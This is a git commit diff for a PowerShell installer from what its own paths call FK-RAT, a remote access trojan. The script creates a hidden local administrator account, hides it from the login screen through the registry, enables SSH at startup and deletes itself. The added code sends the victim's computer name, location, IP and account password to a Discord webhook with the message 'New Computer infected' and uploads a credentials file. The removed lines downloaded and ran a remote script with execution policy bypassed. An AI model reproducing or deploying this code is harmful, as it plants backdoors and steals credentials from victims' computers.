f58db2d1d43e5e2318de1dabf05d2bfeb3d5d617
Sunnickel <alexanderreiter20@gmail.com>
2023-11-01 20:49:28 +0100

    bundeld installer and webhook

--- files/installer.ps1
+++ files/installer.ps1
@@ -3,6 +3,7 @@ function randomText {
   return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
 }
 word
+
 ## Create Local Admin FUNCTION
 function createAdmin {
   param (
@@ -21,6 +22,29 @@ function createAdmin {
   }
 }
 
+## Sends Infos to Discord Webhook
+function upload_discord {
+
+  [CmdletBinding()]
+  param (
+      [parameter(Position=0,Mandatory=$False)]
+      [string]$file,
+      [parameter(Position=1,Mandatory=$False)]
+      [string]$text 
+  )
+
+  
+  $Body = @{
+    'username' = $env:username
+    'content' = $text
+  }
+  
+  if (-not ([string]::IsNullOrEmpty($text))){
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri $Webhook  -Method Post -Body ($Body | ConvertTo-Json)};
+  
+  if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $Webhook}
+  }
+
 ## Temp Directory
 ## variables
 $temp = "$env:temp"
@@ -31,11 +55,24 @@ $uName = "fkrat"
 $pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
-
-
+$Webhook = Get-Content ./webhook
+$language = (Get-WinUserLanguageList)[0].autonym
+$country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
+$country = $country.Substring(0, $country.length - 2)
+$description = 
+"
+New Computer infected 
+---------------------------------
+Computer Name = $env:computername 
+Computer Language = $language
+Location (country) = $country
+IP = $ip
+Account Password = $password
+"
 New-Item ./$env:computername.fk -Value (
   $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
 )
+$payload = [PSCustomObject]@{content=$description}
 
 ## Create Admin
 createAdmin -uName $uName -pWord $pWord
@@ -45,9 +82,10 @@ New-Item -Path $rPath -Force
 New-ItemProperty -Path $rPath -Name $uName -Value 00000000
 Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 
-## get webhook
-Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/webhook.ps1 -OutFile webhook.ps1
-Start-Process powershell powershell.exe -windowstyle hidden -ep bypass -File .\webhook.ps1
+## Sends Discord Webhook
+Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
+upload_discord("$env:computername.fk")
+
 
 ## goto Temp and make dir 
 Set-Location $temp	
@@ -61,4 +99,6 @@ Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
 ## Self Delete
+Remove-Item ./webhook
+Remove-Item ./"$env:computername.fk"
 Remove-Item $PSCommandPath -Force 
